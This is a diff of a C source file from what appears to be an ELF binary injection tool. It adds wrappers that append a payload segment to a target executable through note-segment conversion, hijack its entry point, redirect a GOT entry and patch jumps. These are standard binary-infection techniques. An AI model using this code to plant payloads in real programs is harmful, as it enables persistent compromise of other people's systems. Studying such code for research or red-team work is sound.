@@ -17,23 +17,21 @@ static size_t get_file_size(const char *filepath) {
     return filestat.st_size;
 }
 
-int _inject_PT_NOTE_hijack_entry(char *bin_path, char *payload_path)
+int _inject_note_segment_hijack_entry(char *bin_path, char *payload_path)
 {
     struct segment_entry payload_segment;
     struct map_entry target_file;
     size_t payload_size = get_file_size(payload_path);
-    printf("Payload size: %x\n", payload_size);
     int rc;
     rc = map_file(bin_path, &target_file);
     Elf64_Addr target_addr = get_addr_after_segments(&target_file);
     assert(rc == 0);
     // the address will be corrected to be congruent with offset mod page_size
-    rc = inject_PT_NOTE(target_addr,
-                        payload_size,
-                        &target_file,
-                        &payload_segment);
+    rc = inject_note_segment(target_addr,
+                             payload_size,
+                             &target_file,
+                             &payload_segment);
     assert(rc == 0);
-    printf("Got target_addr %lx\n", payload_segment.s_addr);
     Elf64_Addr orig_entry = hijack_entry(payload_segment.s_addr, &target_file);
     unmap_file(&target_file);
     // we are appending content to the file, so, we need to unmap to commit
@@ -46,10 +44,56 @@ int _inject_PT_NOTE_hijack_entry(char *bin_path, char *payload_path)
     return 0;
 }
 
-#ifdef QUICK_TEST
-int main(int argc, char **argv)
+Elf64_Addr _hijack_entry(char *bin_path, Elf64_Addr addr)
 {
-    _inject_PT_NOTE_hijack_entry(argv[1], argv[2]);
-    return 0;
+    struct map_entry target_file;
+    int rc;
+    rc = map_file(bin_path, &target_file);
+    assert(rc == 0);
+    Elf64_Addr orig_entry = hijack_entry(addr, &target_file);
+    unmap_file(&target_file);
+    return orig_entry;
 }
-#endif
+
+Elf64_Addr _inject_note_segment(char *bin_path, char *payload_path)
+{
+    struct segment_entry payload_segment;
+    struct map_entry target_file;
+    size_t payload_size = get_file_size(payload_path);
+    int rc;
+    rc = map_file(bin_path, &target_file);
+    assert(rc == 0);
+    Elf64_Addr target_addr = get_addr_after_segments(&target_file);
+    // the address will be corrected to be congruent with offset mod page_size
+    rc = inject_note_segment(target_addr,
+                             payload_size,
+                             &target_file,
+                             &payload_segment);
+    assert(rc == 0);
+    unmap_file(&target_file);
+    rc = append_payload(bin_path, payload_path);
+    assert(rc == 0);
+    return payload_segment.s_addr;
+}
+
+Elf64_Addr _hijack_got(char *bin_path, char *symbol_name, Elf64_Addr addr)
+{
+    struct map_entry target_file;
+    int rc;
+    rc = map_file(bin_path, &target_file);
+    assert(rc == 0);
+    Elf64_Addr orig_addr = hijack_got(symbol_name, addr, &target_file);
+    unmap_file(&target_file);
+    return orig_addr;
+}
+
+int _patch_jmp(char *bin_path, Elf64_Addr orig_entry, Elf64_Addr addr)
+{
+    int rc;
+    struct map_entry target_file;
+    rc = map_file(bin_path, &target_file);
+    assert(rc == 0);
+    rc = patch_jmp_after_address(orig_entry, addr, &target_file);
+    unmap_file(&target_file);
+    return rc;
+}
